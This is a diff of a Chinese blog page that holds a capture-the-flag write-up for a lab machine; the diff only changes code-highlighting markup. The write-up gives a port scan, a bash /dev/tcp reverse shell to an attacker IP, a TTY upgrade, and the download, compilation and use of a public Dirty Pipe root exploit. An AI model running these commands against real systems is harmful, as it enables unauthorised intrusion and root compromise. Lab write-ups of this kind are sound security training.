@@ -208,7 +208,7 @@
   <div class="content" itemprop="articleBody">
     <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png"></p>
 <h2 id="寻找立足点"><a href="#寻找立足点" class="headerlink" title="寻找立足点"></a>寻找立足点</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>先对靶机进行端口扫描，发现只开放了22和80端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sS -sCV -T<span class="number">4</span> <span class="number">10.10.11.159</span> -o ports.nmap</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png"></p>
 <h3 id="登陆界面攻击面测试"><a href="#登陆界面攻击面测试" class="headerlink" title="登陆界面攻击面测试"></a>登陆界面攻击面测试</h3><p>访问80端口，是一个登录界面，先尝试登录</p>
@@ -292,13 +292,13 @@
 <p>访问我们的<code>shell</code>，能成功执行系统命令</p>
 <p><img src="https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png"></p>
 <h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>通过我们写入的<code>webshell</code>，反弹一个<code>shell</code>回来，翻遍后续的操作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span> -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="number">10.10.16.6</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png"></p>
 <p><img src="https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png"></p>
 <p>本地开启的监听接收到了反弹<code>shell</code></p>
 <p>通过以下命令，将反弹回来的<code>shell</code>升级为完全交互式的<code>shell</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">ctrl+z</span><br><span class="line">stty raw -echo; fg</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ctrl+z</span><br><span class="line">stty raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png"></p>
 <h3 id="Dirty-Pipe提权漏洞"><a href="#Dirty-Pipe提权漏洞" class="headerlink" title="Dirty Pipe提权漏洞"></a>Dirty Pipe提权漏洞</h3><p>查看系统的版本为<code>5.16</code></p>
@@ -312,14 +312,14 @@
 <p>这台靶机服务器的版本在影响范围内，所以我们可以直接下载<code>exploit</code>并编译，上传到靶机中执行，来获得<code>root</code>权限</p>
 <p>现在攻击机下载<a target="_blank" rel="noopener" href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">DirtyPipe-Exploits</a>，并编译。因为攻击机和靶机的Linux版本不一样，所以使用<code>-fPIC -static</code>参数进行编译，防止因编译环境不一致导致<code>exploit</code>运行出现问题</p>
 <p><img src="https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c</span><br><span class="line"></span><br><span class="line">gcc exploit-2.c -o exp -fPIC -static </span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/AlexisAhmed/</span>CVE-<span class="number">2022</span>-<span class="number">0847</span>-DirtyPipe-Exploits<span class="regexp">/main/</span>exploit-<span class="number">2</span>.c</span><br><span class="line"></span><br><span class="line">gcc exploit-<span class="number">2</span>.c -o exp -fPIC -static </span><br></pre></td></tr></table></figure>
 
 <p>在攻击机用<code>python</code>起一个简易的服务器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png"></p>
 <p>在靶机下载，并赋予执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.16.6/exp</span><br><span class="line"></span><br><span class="line">chmod +x ./exp</span><br></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="number">10.10</span>.<span class="number">16.6</span>/<span class="keyword">exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">chmod</span> +<span class="keyword">x</span> ./<span class="keyword">exp</span></span><br></pre></td></tr></table></figure>
 
 <p>按照<code>exploit</code>作者的使用方法，执行<code>exploit</code>劫持<code>SUID</code>成功提升至<code>root</code>权限</p>
 <p><img src="https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png"></p>
